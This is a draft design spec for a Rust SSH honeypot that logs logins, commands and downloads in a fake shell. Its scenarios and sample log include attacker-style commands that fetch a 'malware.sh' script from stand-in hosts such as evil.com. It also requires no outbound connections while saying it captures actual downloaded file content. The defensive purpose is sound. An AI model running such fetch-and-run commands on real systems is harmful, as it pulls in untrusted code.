# SPEC-001: SSH Honeypot Core

**Status**: Draft
**Author**: Claude
**Created**: 2025-11-09
**Target**: v0.1.0

## Overview

DrHPotter SSH honeypot core provides a minimal, secure, high-interaction SSH honeypot implementation in Rust. The honeypot accepts SSH connections, logs all activity, and provides a fake shell environment to capture attacker behavior.

## Goals

1. Accept SSH connections on configurable port (default: 2222)
2. Log all authentication attempts (username/password)
3. Provide interactive fake shell that logs all commands
4. Capture downloaded files/malware
5. Generate structured JSON logs for analysis
6. Maintain security isolation (no real system access)

## Non-Goals (v0.1.0)

- Public key authentication
- SCP/SFTP support
- Multi-session handling
- Real-time alerting
- Web dashboard

## Architecture

### Components

1. **SSH Server** (`src/server/`)
   - Listens on TCP port
   - Handles SSH protocol negotiation
   - Manages authentication
   - Creates sessions

2. **Fake Shell** (`src/shell/`)
   - Emulates bash-like environment
   - Implements common commands (ls, cd, pwd, cat, wget, curl)
   - Maintains fake in-memory filesystem
   - Logs all command execution

3. **Capture Engine** (`src/capture/`)
   - Structured logging (JSON)
   - Session recording
   - File/download capture
   - Attack pattern detection

4. **Security Layer** (`src/security/`)
   - Rate limiting (max 10 connections per IP per minute)
   - Session timeouts (30 minutes max)
   - Resource limits
   - No external system access

## Behavior Specifications

### Authentication

```
GIVEN an attacker connects to the honeypot
WHEN they provide any username and password
THEN the honeypot accepts the credentials
AND logs the authentication attempt
AND creates a fake shell session
AND responds within 1-3 seconds (realistic delay)
```

### Shell Interaction

```
GIVEN an authenticated session exists
WHEN the attacker executes "ls"
THEN the honeypot returns a realistic directory listing
AND logs the command execution
```

```
GIVEN an authenticated session exists
WHEN the attacker executes "wget http://example.com/malware.sh"
THEN the honeypot simulates downloading the file
AND captures the actual file content
AND logs the download URL and content
AND stores the file with SHA256 hash
```

### Session Management

```
GIVEN a session has been active for 30 minutes
WHEN the timeout is reached
THEN the honeypot gracefully closes the connection
AND finalizes the session log
```

## Data Format

### Session Log (JSON)

```json
{
  "session_id": "550e8400-e29b-41d4-a716-446655440000",
  "timestamp_start": "2025-11-09T10:30:00Z",
  "timestamp_end": "2025-11-09T10:45:23Z",
  "source_ip": "192.168.1.100",
  "source_port": 54321,
  "auth": {
    "username": "root",
    "password": "toor",
    "attempts": 1,
    "success": true
  },
  "commands": [
    {
      "timestamp": "2025-11-09T10:30:15Z",
      "input": "uname -a",
      "output": "Linux honeypot 5.10.0-generic x86_64 GNU/Linux"
    },
    {
      "timestamp": "2025-11-09T10:30:18Z",
      "input": "ls -la",
      "output": "total 48\ndrwxr-xr-x 2 root root 4096..."
    }
  ],
  "downloads": [
    {
      "timestamp": "2025-11-09T10:32:00Z",
      "url": "http://evil.com/malware.sh",
      "sha256": "abc123...",
      "size_bytes": 4096,
      "path": "/var/honeypot/files/abc123..."
    }
  ],
  "statistics": {
    "duration_seconds": 923,
    "commands_executed": 15,
    "bytes_sent": 8192,
    "bytes_received": 2048
  }
}
```

## Security Requirements

1. **Isolation**: Honeypot must not access real filesystem
2. **Rate Limiting**: Max 10 connections per IP per minute
3. **Resource Limits**: Max 100MB memory per session
4. **Timeouts**: 30 minute max session, 5 second max command execution
5. **No Outbound**: No real network connections from shell commands

## Testing Requirements

### Unit Tests
- SSH authentication logic
- Command parsing and execution
- Fake filesystem operations
- Rate limiting logic
- Session timeout handling

### Integration Tests
- End-to-end SSH connection
- Multi-session handling
- Log file generation
- File capture workflow

### Security Tests
- Attempt to access real filesystem
- Attempt resource exhaustion
- Attempt command injection
- Attempt SSH escape sequences

## Success Criteria

1. Honeypot accepts SSH connections and authenticates attackers
2. All authentication attempts are logged with timestamp, IP, credentials
3. Shell executes at least 10 common commands (ls, cd, pwd, cat, uname, whoami, wget, curl, chmod, ps)
4. Downloaded files are captured and stored with SHA256
5. Sessions properly timeout after 30 minutes
6. Rate limiting prevents >10 connections per IP per minute
7. All tests pass with 90%+ code coverage
8. No unsafe code blocks (zero `unsafe` in codebase)
9. Compiles with `cargo build --release` with zero warnings
10. Memory usage <10MB per session under normal load

## Future Enhancements (Post v0.1.0)

- Public key authentication support
- SCP/SFTP honeypot
- Real-time alerting (webhooks, email)
- Web dashboard for visualization
- Machine learning for attack pattern detection
- Multi-node deployment
- WASM-based log analyzer
